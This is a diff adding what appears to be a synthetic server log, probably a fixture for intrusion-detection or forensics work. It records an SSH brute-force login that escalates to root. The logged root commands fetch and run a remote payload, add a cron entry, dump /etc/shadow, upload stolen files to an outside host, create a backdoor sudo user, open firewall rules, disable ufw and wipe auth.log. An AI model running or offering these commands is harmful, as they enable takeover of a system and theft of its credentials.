@@ -1,0 +1,32 @@
+2024-01-15 03:38:02 INFO  sshd[1234]: Connection from 203.0.113.47 port 51234
+2024-01-15 03:38:03 WARN  sshd[1234]: Failed password for root from 203.0.113.47 port 51234
+2024-01-15 03:38:05 WARN  sshd[1234]: Failed password for root from 203.0.113.47 port 51235
+2024-01-15 03:38:07 WARN  sshd[1234]: Failed password for admin from 203.0.113.47 port 51236
+2024-01-15 03:38:09 WARN  sshd[1234]: Failed password for admin from 203.0.113.47 port 51237
+2024-01-15 03:38:11 WARN  sshd[1234]: Failed password for ubuntu from 203.0.113.47 port 51238
+2024-01-15 03:38:13 WARN  sshd[1234]: Failed password for ubuntu from 203.0.113.47 port 51239
+2024-01-15 03:38:15 WARN  sshd[1234]: Failed password for deploy from 203.0.113.47 port 51240
+2024-01-15 03:38:17 INFO  sshd[1234]: Accepted password for deploy from 203.0.113.47 port 51241
+2024-01-15 03:38:18 INFO  sshd[1234]: pam_unix(sshd:session): session opened for user deploy
+2024-01-15 03:38:22 INFO  sudo[2891]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id
+2024-01-15 03:38:25 INFO  sudo[2892]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+2024-01-15 03:38:30 INFO  bash[2893]: root: wget http://198.51.100.77/tools/payload.sh -O /tmp/.x
+2024-01-15 03:38:31 INFO  bash[2893]: root: chmod +x /tmp/.x
+2024-01-15 03:38:32 INFO  bash[2893]: root: /tmp/.x &
+2024-01-15 03:38:35 INFO  crontab[2900]: root: (crontab -l; echo "*/5 * * * * /tmp/.x") | crontab -
+2024-01-15 03:38:40 INFO  bash[2893]: root: cat /etc/passwd > /tmp/pass_dump.txt
+2024-01-15 03:38:41 INFO  bash[2893]: root: cat /etc/shadow > /tmp/shadow_dump.txt
+2024-01-15 03:38:42 WARN  auditd[450]: Suspicious file read: /etc/shadow by PID 2893 (bash) uid=0
+2024-01-15 03:38:45 INFO  bash[2893]: root: tar czf /tmp/loot.tar.gz /tmp/pass_dump.txt /tmp/shadow_dump.txt /home
+2024-01-15 03:38:50 INFO  bash[2893]: root: curl -T /tmp/loot.tar.gz ftp://198.51.100.77/upload/
+2024-01-15 03:38:55 INFO  netstat: ESTABLISHED 10.0.0.5:45678 -> 198.51.100.77:21 (ftp)
+2024-01-15 03:39:00 INFO  bash[2893]: root: useradd -m -s /bin/bash -G sudo backdoor_user
+2024-01-15 03:39:01 INFO  bash[2893]: root: echo 'backdoor_user:P@$$w0rd123' | chpasswd
+2024-01-15 03:39:05 INFO  bash[2893]: root: iptables -I INPUT -s 203.0.113.47 -j ACCEPT
+2024-01-15 03:39:06 INFO  bash[2893]: root: iptables -I OUTPUT -d 198.51.100.77 -j ACCEPT
+2024-01-15 03:39:10 INFO  bash[2893]: root: echo "" > /var/log/auth.log
+2024-01-15 03:39:10 WARN  auditd[450]: Log file truncated: /var/log/auth.log by PID 2893 uid=0
+2024-01-15 03:39:15 INFO  bash[2893]: root: systemctl stop ufw
+2024-01-15 03:39:20 INFO  bash[2893]: root: systemctl disable ufw
+2024-01-15 03:41:00 INFO  sshd[3100]: Connection from 198.51.100.77 port 62001
+2024-01-15 03:41:01 INFO  sshd[3100]: Accepted password for backdoor_user from 198.51.100.77 port 62001
